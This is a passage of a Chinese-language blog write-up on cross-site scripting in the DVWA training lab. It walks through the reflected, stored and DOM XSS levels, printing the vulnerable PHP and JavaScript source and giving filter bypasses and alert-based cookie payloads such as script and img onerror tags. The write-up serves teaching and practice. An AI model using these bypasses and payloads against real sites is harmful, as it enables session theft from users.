          <a href="#High" class="heading-link"><i class="fas fa-link"></i></a><a href="#High" class="headerlink" title="High"></a>High</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">核心源码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>
<ul>
<li>代表一个或多个任意字符，i 代表不区分大小写。所以此标签在这里就不能用了，但可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码</li>
</ul>

        <h2 id="Impossible">
          <a href="#Impossible" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible" class="headerlink" title="Impossible  "></a>Impossible  </h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">核心源码：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">    // Get input</span><br><span class="line">    $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>
<p>htmlspecialchars(string)：<br>把预定义的字符:”&lt;”（小于）、 “&gt;”（大于）、&amp; 、 ‘’ 、 “” 转换为HTML实体，防止浏览器将其作为HTML元素。</p>

        <h2 id="DVWA-Stored-Cross-Site-Scripting">
          <a href="#DVWA-Stored-Cross-Site-Scripting" class="heading-link"><i class="fas fa-link"></i></a><a href="#DVWA-Stored-Cross-Site-Scripting" class="headerlink" title="DVWA:Stored Cross Site Scripting"></a>DVWA:Stored Cross Site Scripting</h2>
      
        <h2 id="Low-1">
          <a href="#Low-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2>
      <p><img src="/2022/12/26/XSS/4.png"><br>trim(string,charlist) ： 移除string字符两侧的预定义字符，预定义字符包括\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符<br>stripslashes(string)： 去除掉string字符的反斜杠<br>mysqli_real_escape_string(string,connection) ：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义<br>以上的过滤是针对预防SQL注入的，对咱们的XSS并没有采取任何防御。<br>此时我们在注入的时候突然发现在NAME那里似乎有长度限制，我们无法将脚本注入，此时我们对这个限制输入长度进行修改<br><img src="/2022/12/26/XSS/5.png"><br>查看源码发现我们的恶意脚本已经插入；而因为我们的恶意脚本已经是被插入后台，所以，每当后台查寻我们的id时总会带着这个恶意脚本，所以储存型XSS又叫持久型XSS，当我们随便输入一个name时，后台也还是会把我们之前注入的恶意脚本弹出。<br><img src="/2022/12/26/XSS/6.png"><br>当然如果不进行修改长度的话本题也可以使用bp进行拦截，然后直接在bp里面修改我们的payload然后直接进行防包的话也是可以成功的。</p>

        <h2 id="Medium-1">
          <a href="#Medium-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="/2022/12/26/XSS/7.png"><br>strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用b标签。<br>addslasses()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。<br>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了script标签，仍然存在存储型的XSS。<br>方法一：大写绕过&#x2F;大小写绕过<br>方法二：双写绕过<br>方法三：更换其他标签</p>

        <h2 id="High-1">
          <a href="#High-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-1" class="headerlink" title="High"></a>High</h2>
      <p><img src="/2022/12/26/XSS/8.png"><br>此题的过滤对message进行了非常严格的过滤；所以我们把攻击点放到了name进行攻击，此时的过滤机制是对script标签进行了一个大小写匹配和无限次的匹配，所以此时我们的script的标签无法使用，但是我们可以使用其他的标签进行一个绕过</p>

        <h2 id="Impossile">
          <a href="#Impossile" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossile" class="headerlink" title="Impossile"></a>Impossile</h2>
      <p><img src="/2022/12/26/XSS/9.png"><br>此时是先对我们的token进行了一个检查，防止我们使用CSRF进行一个跨站请求伪造，进行一个利用cookie进行恶意操作；接下来使用trim()函数移除了字符串两侧的恶意字符，接着删除$message里面的反斜杠，防止SQL注入；接着进行一个数据库查询，然后利用htmlspecialchars( $message )使我们的脚本标签无法使用；做到了全面防御接下来对$name的过滤也是一样<br>；使我们无法注入恶意脚本进行攻击。</p>

        <h2 id="DVWA-DOM-Based-Cross-Site-Scripting">
          <a href="#DVWA-DOM-Based-Cross-Site-Scripting" class="heading-link"><i class="fas fa-link"></i></a><a href="#DVWA-DOM-Based-Cross-Site-Scripting" class="headerlink" title="DVWA:DOM Based Cross Site Scripting"></a>DVWA:DOM Based Cross Site Scripting</h2>
      <p>HTMLDOM是关于如何获取、修改、添加或删除HTML元素的标准简单来说DOM主要研究的是节点，所有节点可通过javascript访问(增，删，改，查)<br>可能触发DOM型XSS属性：本实验中主要用到的就是document.write属性<br>document.write属性<br>document.referer属性<br>innerHTML属性<br>windows.name属性<br>location属性</p>

        <h2 id="Low-2">
          <a href="#Low-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2>
      <p>在我查看源码时发现并没有源码，我便点击F12果然发现了点不一样的东西<br><img src="/2022/12/26/XSS/11.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">            var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">            document.write(&quot;&lt;option value=&#x27;&quot; + lang + &quot;&#x27;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">            document.write(&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">              </span><br><span class="line">          document.write(&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">          document.write(&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">          document.write(&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">          document.write(&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;);</span><br></pre></td></tr></table></div></figure>
<p>#document.location.href.indexOf()函数截取url中指定参数后面的内容<br>#document.location.href.substring()函数截取字符串<br>#decodeURI()函数将编码过的URI进行解码<br>#docunment.write()可以将HTML表达式或JavaScript代码<br>可以看出本关并没有任何的防御措施，所以直接注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
<p>即可获取cookie</p>

        <h2 id="Medium-2">
          <a href="#Medium-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="/2022/12/26/XSS/12.png"><br>我们知道后台通过查询$default中script标签的位置，若是查询到了该标签的位置，则强行把English赋值赋给$default<br>这相当于对script标签做了一个过滤，所以我们需要做的就是绕过改机制，还是老方法，大写&#x2F;大小写绕过；双写绕过；换<br>另外的标签进行绕过；嗯此时发现不行，嗯失效了，很尴尬，老方法行不通了；对比了了一下LOW级别的发现确实没有插入成功<br>网上查了一下发现stripos()函数的查找是不缺分大小写的<br><img src="/2022/12/26/XSS/13.png"><br><img src="/2022/12/26/XSS/14.png"><br>当我换了另外一种标签时</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 οnerrοr=alert(&#x27;document.cookie&#x27;)&gt;发现img标签还是没能插入</span><br></pre></td></tr></table></div></figure>
<p><img src="/2022/12/26/XSS/15.png"><br>补充知识点：<br>由于select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS<br>所以我们需要闭合两个标签才可以使我们的img标签逃逸出来此时发现已经成功插入了首先闭合了option标签 和select标签利用 img标签的onerror事件javascript，img标签支持onerror事件，在加载图像的过程中如果发生了错误，就会触发onerror事件执行 JavaScript<br><img src="/2022/12/26/XSS/16.png"></p>

        <h2 id="High-2">
          <a href="#High-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-2" class="headerlink" title="High"></a>High</h2>
      <p><img src="/2022/12/26/XSS/17.png"><br>采用白名单方式判断default的值。如果不是French,English,German,Spanish四者之一。则利用header()函数将default的值改为English再发送http请求。<br>绕过：需要一种方法在本地运行你的JS代码而无需经过服务器端的处理。这里提供的一种方法就是，应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。<br>我的理解就是：URL中#号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互<br>payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Engliah#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ FIN ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Autor: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Enlace: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2022/12/26/XSS/">https://hyggevv.github.io/2022/12/26/XSS/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">Todos los artículos de este blog están bajo licencia  de <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> a menos que se indique lo contrario</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/12/28/pikachu-xss/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Pikachu:XSS</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/12/25/How-browsers-work/"><span class="paginator-prev__text">How browsers work</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Contenido</span><span class="sidebar-nav-ov">Reseña</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XSS%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">
          什么是 XSS：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">
          XSS的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8BXSS"><span class="toc-number">3.</span> <span class="toc-text">
          储存型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">4.</span> <span class="toc-text">
          反射型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">5.</span> <span class="toc-text">
          DOM型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">6.</span> <span class="toc-text">
          XSS的攻击载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-Reflected-Cross-Site-Scripting"><span class="toc-number">7.</span> <span class="toc-text">
          DVWA:Reflected Cross Site Scripting </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low"><span class="toc-number">8.</span> <span class="toc-text">
          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium"><span class="toc-number">9.</span> <span class="toc-text">
          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High"><span class="toc-number">10.</span> <span class="toc-text">
          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible"><span class="toc-number">11.</span> <span class="toc-text">
          Impossible  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-Stored-Cross-Site-Scripting"><span class="toc-number">12.</span> <span class="toc-text">
          DVWA:Stored Cross Site Scripting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-1"><span class="toc-number">13.</span> <span class="toc-text">
          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-1"><span class="toc-number">14.</span> <span class="toc-text">
          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-1"><span class="toc-number">15.</span> <span class="toc-text">
          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossile"><span class="toc-number">16.</span> <span class="toc-text">
          Impossile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA-DOM-Based-Cross-Site-Scripting"><span class="toc-number">17.</span> <span class="toc-text">
          DVWA:DOM Based Cross Site Scripting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-2"><span class="toc-number">18.</span> <span class="toc-text">
          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-2"><span class="toc-number">19.</span> <span class="toc-text">
          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-2"><span class="toc-number">20.</span> <span class="toc-text">
          High</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">102</div><div class="sidebar-ov-state-item__name">Archivo</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categorías</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Etiquetas</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">Has leído </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Potenciado por <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Tema - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Vistas</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>